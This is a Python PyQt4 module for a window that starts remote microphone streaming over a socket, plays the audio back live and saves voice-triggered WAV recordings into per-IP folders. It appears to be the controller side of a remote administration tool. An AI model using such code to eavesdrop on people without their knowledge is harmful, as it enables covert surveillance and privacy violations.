from PyQt4.QtGui import *
from PyQt4.QtCore import *

import pyaudio
import socket
import datetime
import os
import threading
from array import array
import wave

from main_ui import Ui_Form

from libs.modechat import get, send


class mainPopup(QWidget, Ui_Form):

    def __init__(self, args):
        QWidget.__init__(self)
        self.setupUi(self)

        self.sock = args['sock']
        self.socket = args['socket']
        self.ipAddress = args['ipAddress']

        self.setWindowTitle('Audio Streaming from - %s - Socket #%s' % (self.ipAddress, self.socket))

        self.stopButton.setDisabled(True)

        self.defaultInputDeviceNameLabel.setText(get(self.sock, 'getDefaultInputDeviceName', 'getname'))

        self.listenButton.clicked.connect(self.start_listen)
        self.recordButton.clicked.connect(self.start_record)
        self.stopButton.clicked.connect(self.stopListen)
        self.alwaysTopButton.clicked.connect(self.always_top)

    def stopListen(self):
        send(self.sock, 'stopAudio', 'stopaudio')
        try:
            self.audio.active = False

            self.stop_volume_control()

        except AttributeError:
            pass

        # Flush Buffer
        self.listenButton.setDisabled(True)
        self.recordButton.setDisabled(True)
        self.stopButton.setDisabled(True)

        self.sock.settimeout(1)
        try:
            l = self.sock.recv(1024)
            while l:
                l = self.sock.recv(1024)
        except socket.timeout:
            pass

        self.listenButton.setDisabled(False)
        self.recordButton.setDisabled(False)
        self.stopButton.setDisabled(True)

    def start_listen(self):
        rate = self.rateDrop.currentText()
        data = get(self.sock, 'startAudio %s' % rate, 'startaudio')
        if data == 'audioStarted':
            self.audio = ListenAudio(self.sock,
                                     int(rate),
                                     autorecord=False,
                                     id=self.ipAddress,
                                     detect=0)
            self.audio.start()
            self.start_volume_control()
            self.listenButton.setDisabled(True)
            self.recordButton.setDisabled(True)
            self.stopButton.setDisabled(False)
        else:
            self.listenButton.setDisabled(False)
            self.recordButton.setDisabled(False)
            self.stopButton.setDisabled(True)

    def start_record(self):
        rate = self.rateDrop.currentText()
        data = get(self.sock, 'startAudio %s' % rate, 'startaudio')
        if data == 'audioStarted':
            self.audio = ListenAudio(self.sock,
                                     int(rate),
                                     autorecord=True,
                                     id=self.ipAddress,
                                     detect=int(self.volumeSlider.value()))
            self.audio.start()
            self.start_volume_control()
            self.listenButton.setDisabled(True)
            self.recordButton.setDisabled(True)
            self.stopButton.setDisabled(False)
        else:
            self.listenButton.setDisabled(False)
            self.recordButton.setDisabled(False)
            self.stopButton.setDisabled(True)

    def start_volume_control(self):
        # Create a QTimer
        self.timer = QTimer()
        self.timer.setSingleShot(False)
        self.timer.timeout.connect(self.set_volume_bar)
        self.timer.start(10)

    def stop_volume_control(self):
        self.timer.stop()

    def set_volume_bar(self):
        try:
            volume = self.audio.volume
            self.volumeProgress.setValue(int(volume))
            status = self.audio.status
            self.statusLabel.setText(status)
        except AttributeError:
            pass

    def always_top(self):
        if self.alwaysTopButton.isChecked():
            self.setWindowFlags(self.windowFlags() | Qt.WindowStaysOnTopHint)
            self.show()
        else:
            self.setWindowFlags(self.windowFlags() & ~Qt.WindowStaysOnTopHint)
            self.show()

    def closeEvent(self, event):
        self.stopListen()


class ListenAudio(threading.Thread):
    def __init__(self, sock, rate, autorecord, id, detect):
        super(ListenAudio, self).__init__()

        self.sock = sock
        self.active = True
        self.rate = rate
        self.volume = 0
        self.autorecording = autorecord
        self.volume_for_recording = detect
        self.silent_count = 50
        self.cur_silent_count = 0

        self.active_recording = False

        self.status = 'Not Recording'

        self.folder = os.path.join('ServersData', id, 'Audio')
        if not os.path.exists(self.folder):
            os.makedirs(self.folder)

        self.frames = []

        # Pyaudio Initialization
        self.chunk = 1024
        self.p = pyaudio.PyAudio()

        if self.autorecording:
            self.recording_file = self.file_for_record(self.new_file())

        self.stream = self.p.open(format=pyaudio.paInt16, channels=1, rate=self.rate, output=True)

    def new_file(self):
        now = datetime.datetime.now()
        return os.path.join(self.folder, '%s-%s-%s-%s-%s-%s.wav' % (now.year, now.month, now.day, now.hour, now.minute, now.second))

    def file_for_record(self, wave_file):
        wavefile = wave.open(wave_file, 'wb')
        wavefile.setnchannels(1)
        wavefile.setsampwidth(self.p.get_sample_size(pyaudio.paInt16))
        wavefile.setframerate(self.rate)
        return wavefile

    def auto_recording(self, volume, chunk):
        self.recording_file.writeframes(chunk)
        if volume >= self.volume_for_recording:
            self.active_recording = True
            self.status = 'Recording'
            self.cur_silent_count = 0
        else:
            self.cur_silent_count += 1
            if self.cur_silent_count >= self.silent_count:
                if self.active_recording:
                    self.recording_file.close()
                    self.recording_file = self.file_for_record(self.new_file())
                    self.status = 'No Sound'
                    self.active_recording = False
                self.cur_silent_count = 0

    def run(self):
        while self.active:
            try:
                chunk = self.sock.recv(1024)
                sound_data = array('h', chunk)
                self.volume = max(sound_data)
                self.stream.write(chunk)
                if self.autorecording:
                    self.auto_recording(max(sound_data), chunk)
            except (socket.error, ValueError):
                break
        if self.autorecording:
            self.recording_file.close()
        self.stream.close()
        self.p.terminate()
